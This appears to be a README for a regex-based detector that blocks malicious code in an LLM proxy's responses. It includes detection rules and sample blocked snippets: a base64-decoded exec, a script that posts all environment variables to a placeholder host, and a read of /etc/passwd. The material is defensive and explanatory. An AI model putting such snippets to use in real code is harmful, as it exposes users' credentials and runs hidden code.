# Malicious Code Pattern Detector (Phase 0.5)

## Overview

The **Malicious Code Pattern Detector** is a lightweight, always-on security phase that detects suspicious code patterns in LLM responses. It catches code trying to:
- Execute arbitrary code (`eval()`, `exec()` + obfuscation)
- Steal credentials/environment variables and exfiltrate them
- Run shell commands with dangerous flags
- Access sensitive system files
- Create backdoors or persistence mechanisms

Unlike the sandbox phase (which requires Docker), this uses pure regex pattern matching on the existing `RuleSet` from `detection_rules.py`, so it's **lightweight and always enabled by default**.

## How It Works

### Pattern Detection (Rule-Based)

The detector scans code using 20+ pre-defined rules organized by category:

| Category | Rules | Examples |
|---|---|---|
| **Process** | PROC001-005 | `os.system()`, `eval()`, `exec()`, `__import__()`, PTY spawn |
| **Network** | NET001-004 | HTTP requests, sockets, FTP, SSH |
| **File System** | FS001-003 | File writes, sensitive file access (`/etc/passwd`), directory traversal |
| **System Info** | SYS001-002 | System info gathering, environment variable access |
| **Privilege** | PRIV001-002 | Permission changes (`chmod`), privilege escalation (`sudo`) |
| **Encoding** | ENC001-002 | Base64, hex encoding/decoding |
| **Data** | DATA001-002 | Large data transfers, clipboard access |
| **Crypto** | CRYP001 | Cryptographic operations |
| **Database** | DB001 | Database connections |

### Combination Scoring

Individual rules can have false positives (e.g., `eval()` in a math library). The detector combines patterns to identify malicious intent:

**CRITICAL Risk** (always block):
- `eval`/`exec` + base64/hex decoding → obfuscated code execution
- `os.environ` + HTTP/socket requests → credential exfiltration
- `shell=True` + `os.environ` → environment-stealing shell execution

**HIGH Risk** (block by default):
- `eval()`/`exec()` alone (severity 9)
- `os.system()` alone (severity 8)
- `/etc/passwd`, `/.ssh/`, `/.aws/` file access (severity 8)
- `chmod`/`chown` permission changes (severity 7)
- Privilege escalation attempts (severity 9)

**MEDIUM Risk** (allow but warn):
- Multiple medium-risk patterns
- Subprocess execution, file writes, network access (individually)

**LOW Risk** (allow):
- Individual low-risk patterns

## Configuration

### Environment Variables

```bash
# Enable/disable the detector (default: enabled)
MALICIOUS_CODE_ENABLED=true

# Block level: HIGH (default) or CRITICAL
# HIGH: Block on any high-risk pattern
# CRITICAL: Block only on critical patterns (exec+obfuscation, env+exfiltration)
MALICIOUS_CODE_BLOCK_LEVEL=HIGH
```

### Default Settings

- **Enabled**: `true` — runs on every code block
- **Block Level**: `HIGH` — most conservative, blocks on individual high-risk rules
- **Impact**: ~1-2ms per code block (pure regex, no I/O)

## Examples

### Blocked: Code Obfuscation Attack

```python
# User asks: "Show me how to encode and execute code"
import base64
code = base64.b64decode('aW1wb3J0IG9z')
exec(code)  # Base64 decoded + executed
```

**Detection**: `PROC003` (eval/exec) + `ENC001` (base64) → **CRITICAL**
**Result**: ❌ Blocked with `MALICIOUS_CODE_PATTERN`

### Blocked: Credential Exfiltration

```python
# User asks: "How do I send environment variables to my API?"
import os
import requests
env_vars = os.environ
requests.post('http://api.example.com/config', data=env_vars)
```

**Detection**: `SYS002` (os.environ) + `NET001` (requests.post) → **CRITICAL**
**Result**: ❌ Blocked with `MALICIOUS_CODE_PATTERN`

### Blocked: Sensitive File Access

```python
# User asks: "Show me how to read system files"
with open('/etc/passwd', 'r') as f:
    print(f.read())
```

**Detection**: `FS002` (sensitive file access) → **HIGH**
**Result**: ❌ Blocked with `MALICIOUS_CODE_PATTERN`

### Allowed: Safe File Operations

```python
# User asks: "How do I read a CSV?"
import pandas as pd
df = pd.read_csv('data.csv')
print(df.head())
```

**Detection**: No suspicious patterns matched
**Risk Level**: **SAFE**
**Result**: ✅ Allowed

### Allowed: Legitimate Subprocess

```python
# User asks: "How do I run a command?"
import subprocess
result = subprocess.run(['echo', 'hello'], capture_output=True)
print(result.stdout.decode())
```

**Detection**: `PROC002` (subprocess) alone → **MEDIUM** (safe without `shell=True`)
**Result**: ✅ Allowed (subprocess without shell=True is safe)

## Testing

### Quick Unit Test

```bash
cd /home/malakx/LLM-proxy\ \(Copy\)
python3 << 'EOF'
from src.output_security.malicious_code_detector import MaliciousCodeDetector

detector = MaliciousCodeDetector()

# Test: Exec + obfuscation should block
code = """
import base64
exec(base64.b64decode('aW1wb3J0IG9z'))
"""
result = detector.scan(code)
print(f"Allowed: {result.allowed}, Risk: {result.risk_level}, Code: {result.block_code}")
# Output: Allowed: False, Risk: CRITICAL, Code: MALICIOUS_CODE_PATTERN
EOF
```

### Integration Test with Proxy

1. **Start the proxy:**
```bash
cd /home/malakx/LLM-proxy\ \(Copy\)
source .venv/bin/activate
uvicorn src.proxy.main:app --host 0.0.0.0 --port 8080 --reload
```

2. **Send a test request:**
```bash
curl -X POST http://localhost:8080/v1/chat/completions \
  -H "Authorization: Bearer local-dev-key" \
  -H "Content-Type: application/json" \
  -d '{
    "model": "claude-3-sonnet",
    "messages": [
      {"role": "user", "content": "Show me how to encode and execute Python code"}
    ]
  }'
```

3. **Expected result**: 400 Bad Request
```json
{
  "error": "MALICIOUS_CODE_PATTERN",
  "message": "Critical security risk: eval/exec + Base64 Encoding"
}
```

4. **Check audit logs:**
```bash
tail -f logs/audit.jsonl | grep MALICIOUS_CODE_PATTERN
```

### Test Suite

Run the existing security tests:
```bash
pytest tests/unit/test_security_orchestrator.py -v
pytest tests/integration/ -v
```

## Performance

- **Regex scanning**: ~1-2ms per code block
- **No external calls**: Pure pattern matching
- **No Docker overhead**: Unlike sandbox phase
- **Always-on overhead**: ~0.1-0.5% of total request latency

## Limitations

1. **Pattern-based only**: No semantic understanding of code intent
   - Workaround: False positives rare with combination scoring

2. **Language support**: Python-focused regex patterns
   - JavaScript patterns included but less comprehensive
   - Other languages not yet supported

3. **Obfuscation bypass**: Advanced obfuscation (concatenation, ROT13) may bypass patterns
   - Future: Phase 2 will add AST analysis for deeper inspection

4. **False positives**: Comments and docstrings that mention dangerous functions
   - Example: `# Use eval() carefully` would match PROC003 rule
   - Mitigation: Low severity score; won't trigger HIGH/CRITICAL unless combined with other patterns

## Future Enhancements (Phase 2+)

- **AST Analysis**: Parse Python/JavaScript into syntax trees for semantic understanding
- **ML Detection**: Train models on known malicious code signatures
- **Language Expansion**: Add patterns for Java, Go, Ruby, C#
- **Behavioral Correlation**: Link patterns with environment access (e.g., `eval()` + `os.getenv()` = suspicious)
- **Whitelist Mode**: Allow specific patterns for legitimate use cases (admin tools, security testing)

## Related Security Phases

| Phase | Focus | Trigger |
|---|---|---|
| **0.5 (This)** | Malicious code patterns | Code inspection |
| **1** | Vulnerable packages | Dependency scanning |
| **2** | Vulnerable versions | Version validation |
| **3** | Transitive vulnerabilities | Dependency tree analysis |
| **4** | Runtime behavior | Sandbox execution |
| **5** | Content safety | Toxicity/hallucination |

## Architecture

### Files

- `src/output_security/malicious_code_detector.py` — MaliciousCodeDetector class
- `src/output_security/detection_rules.py` — RuleSet (reused from sandbox)
- `src/output_security/engine.py` — Integration into output security pipeline
- `config/settings.py` — Configuration flags

### Integration Points

**In `engine.py`:**
1. `check()` — Scans each code block before package loop
2. `check_full()` — Also tracks in `PhaseResult` for detailed audit trails

**Result handling:**
- Returns `OutputPolicyResult(allowed=False, block_code="MALICIOUS_CODE_PATTERN")`
- Flows through existing audit logging in `main.py`

## Audit Logging

When malicious code is detected:

```json
{
  "timestamp": "2026-05-31T02:20:24.872038+00:00",
  "request_id": "req-abc123",
  "action": "BLOCKED",
  "block_code": "MALICIOUS_CODE_PATTERN",
  "block_reason": "Critical security risk: eval/exec + Base64 Encoding",
  "phase_results": [
    {
      "phase": "MALICIOUS_CODE",
      "passed": false,
      "execution_time_ms": 1.2,
      "details": {
        "risk_level": "CRITICAL",
        "violation_count": 2,
        "violations": [
          {
            "rule_id": "PROC003",
            "rule_name": "eval/exec Usage",
            "category": "PROCESS",
            "severity": 9,
            "match_count": 1
          },
          {
            "rule_id": "ENC001",
            "rule_name": "Base64 Encoding",
            "category": "ENCODING",
            "severity": 5,
            "match_count": 1
          }
        ]
      }
    }
  ]
}
```
